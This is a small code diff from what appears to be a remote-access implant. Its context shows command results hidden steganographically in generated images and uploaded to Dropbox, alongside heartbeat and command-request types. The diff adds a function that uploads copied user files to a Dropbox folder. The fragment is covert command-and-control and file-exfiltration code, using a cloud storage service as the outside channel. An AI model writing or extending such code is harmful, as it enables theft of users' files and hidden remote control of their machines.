@@ -1,4 +1,4 @@
-from typing import Tuple, List, Set, FrozenSet
+from typing import Tuple, List, FrozenSet
 
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult
 from common.data.heartbeat import Heartbeat
@@ -39,3 +39,7 @@ def upload_command_result_to_dropbox(command_result: CommandExecutionResult) -> 
     generated_name = generate_unique_image_name(get_properties().image_generator_mode)
     image_with_secret = insert_command_result_into_image(generated_image, command_result)
     upload_file(DropboxFolders.COMMAND_RESULTS, generated_name, image_with_secret)
+
+
+def upload_copied_file(filename: str, payload: bytes) -> None:
+    upload_file(DropboxFolders.COPIED_USER_FILES, filename, payload)
